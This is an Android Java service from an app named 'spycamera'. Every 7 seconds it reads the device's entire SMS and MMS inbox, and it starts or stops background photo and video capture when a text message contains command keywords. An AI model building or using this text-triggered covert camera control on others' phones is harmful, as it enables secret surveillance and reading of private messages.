package com.example.spycamera.ReceiveMessagesServices;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;

import androidx.annotation.Nullable;

import com.example.spycamera.Activities.CameraService;
import com.example.spycamera.Activities.VideoService;
import com.example.spycamera.MainActivity;
import com.example.spycamera.Models.ReceivedMessage;
import com.example.spycamera.Utilities.Constants;
import com.example.spycamera.Utilities.Helper;
import com.example.spycamera.Utilities.SPHelper;

import org.apache.commons.lang3.math.NumberUtils;

import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

public class MessageService extends Service {

    private Handler fetchMessagesHandler;

    private Uri smsURI, mmsURI, mmsMsgPartURI;
    private Cursor fetchMessagesCursor;

    private Context context;
    private List<ReceivedMessage> receivedMessageList;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            Notification notification = AppNotifications.getNotification(getApplicationContext());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
            } else startForeground(1, notification);
            initObj();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startFetchMessageHandler();
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void initObj() {
        context = getApplicationContext();
        smsURI = Uri.parse("content://sms");
        mmsURI = Uri.parse("content://mms");
        mmsMsgPartURI = Uri.parse("content://mms/part");
    }

    private void stopFetchMessageHandler() {
        try {
            if (fetchMessagesHandler != null) {
                fetchMessagesHandler.removeCallbacksAndMessages(null);
                fetchMessagesHandler = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startFetchMessageHandler() {
        try {
            stopFetchMessageHandler();
            fetchMessagesHandler = new Handler();
            fetchMessagesHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        long lastAppRunTime = SPHelper.getLastAppRunTime(context);
                        if (lastAppRunTime > 0) fetchMessagesAndProcess();
                        fetchMessagesHandler.postDelayed(this, 7000);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }, 7000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void fetchMessagesAndProcess() {
        try {
            receivedMessageList = new ArrayList<>();
            receivedMessageList.addAll(fetchSMS());
            receivedMessageList.addAll(fetchMMS());
            closeCursor();
        } catch (Exception e) {
            e.printStackTrace();
        }
        processMessageList();
    }

    private void closeCursor() {
        try {
            if (fetchMessagesCursor != null) fetchMessagesCursor.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getCursorValue(Cursor cursor, String columnName) {
        try {
            return cursor.getString(cursor.getColumnIndexOrThrow(columnName));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private List<ReceivedMessage> fetchSMS() {
        List<ReceivedMessage> smsMessagesList = new ArrayList<>();
        try {
            closeCursor();
            fetchMessagesCursor = getContentResolver().query(smsURI, null, null,
                    null, Telephony.Sms.Inbox.DEFAULT_SORT_ORDER);
            if (fetchMessagesCursor.moveToFirst()) {
                do {
                    try {
                        ReceivedMessage receivedMessage = new ReceivedMessage();
                        long dateTime = NumberUtils.toLong(getCursorValue(fetchMessagesCursor, "date"));
                        receivedMessage.setDateTime(dateTime);
                        receivedMessage.setMessage(getCursorValue(fetchMessagesCursor, "body"));
                        smsMessagesList.add(receivedMessage);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } while (fetchMessagesCursor.moveToNext());
            }
        } catch (Exception exception) {
            exception.printStackTrace();
        } finally {
            closeCursor();
        }
        return smsMessagesList;
    }

    private List<ReceivedMessage> fetchMMS() {
        List<ReceivedMessage> smsMessagesList = new ArrayList<>();
        try {
            closeCursor();
            final String[] projection = new String[]{"*"};
            fetchMessagesCursor = getContentResolver().query(mmsURI, projection, null,
                    null, Telephony.Mms.DEFAULT_SORT_ORDER);
            if (fetchMessagesCursor!=null && fetchMessagesCursor.moveToFirst()) {
                do {
                    try {
                        long rawDate = NumberUtils.toLong(getCursorValue(fetchMessagesCursor, "date"));
                        String id = getCursorValue(fetchMessagesCursor, "_id");
                        String mmsId = "mid=" + id;

                        ReceivedMessage receivedMessage = new ReceivedMessage();
                        receivedMessage.setDateTime(rawDate * 1000);
                        receivedMessage.setMessage(getMessageFromBody(mmsId));
                        smsMessagesList.add(receivedMessage);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } while (fetchMessagesCursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            closeCursor();
        }
        return smsMessagesList;
    }

    private String getMessageFromBody(String mmsId) {
        StringBuilder body = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(mmsMsgPartURI, null, mmsId,
                    null, null);
            while (cursor.moveToNext()) body.append(getCursorValue(cursor, "text"));
            cursor.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return body.toString();
    }

    private void processMessageList() {
        try {
            receivedMessageList.sort(Comparator.comparingLong(ReceivedMessage::getDateTime).reversed());
            for (ReceivedMessage receivedMessage : receivedMessageList) {
                if (receivedMessage != null) {
                    long dateTime = SPHelper.getLastMessageProcessedDateTime(context);
                    long firstAppRunTime = SPHelper.getFirstAppRunTime(context);
                    if (firstAppRunTime > 0 || receivedMessage.getDateTime() >= firstAppRunTime) {
                        if (receivedMessage.getDateTime() == dateTime) break;
                        else {
                            if (startOrStopService(receivedMessage)) {
                                SPHelper.setLastMessageProcessedDateTime(context, receivedMessage.getDateTime());
                                break;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean startOrStopService(ReceivedMessage receivedMessage) {
        try {
            String message = receivedMessage.getMessage().toUpperCase();
            if (message.contains(Constants.CAMERA_ON)) {
                if (!isMyServiceRunning(CameraService.class)) {
                    stopServiceForcefully();
                    startService(Constants.CAMERA_ON);
                }
                return true;
            } else if (message.contains(Constants.VIDEO_ON)) {
                if (!isMyServiceRunning(VideoService.class)) {
                    stopServiceForcefully();
                    startService(Constants.VIDEO_ON);
                }
                return true;
            } else if (message.contains(Constants.CAMERA_OFF) || message.contains(Constants.VIDEO_OFF)) {
                stopServiceForcefully();
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    private void stopServiceForcefully() {
        if (isMyServiceRunning(VideoService.class)) {
            stopService(new Intent(context, VideoService.class));
        }
        if (isMyServiceRunning(CameraService.class)) {
            stopService(new Intent(context, CameraService.class));
        }
        try {
            Thread.sleep(1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void startService(String serviceType) {
        if (!Helper.isAppOnForeground(context)) {
            if (serviceType.equals(Constants.VIDEO_ON)) startVideoService();
            else startCameraService();
        } else {
            Intent intent = new Intent(this, MainActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("serviceType", serviceType);
            startActivity(intent);
        }
    }

    private void startCameraService() {
        if (!isMyServiceRunning(CameraService.class)) {
            Intent serviceIntent = new Intent(this, CameraService.class);
            serviceIntent.putExtra("photoChoice", "1");
            serviceIntent.putExtra("photoChoiceInput", "1000");
            serviceIntent.putExtra("photoBuffer", "5");
            startService(serviceIntent);
        }
    }

    private void startVideoService() {
        if (!isMyServiceRunning(VideoService.class)) {
            Intent serviceIntent = new Intent(this, VideoService.class);
            serviceIntent.putExtra("videoDuration", "60");
            startService(serviceIntent);
        }
    }

}
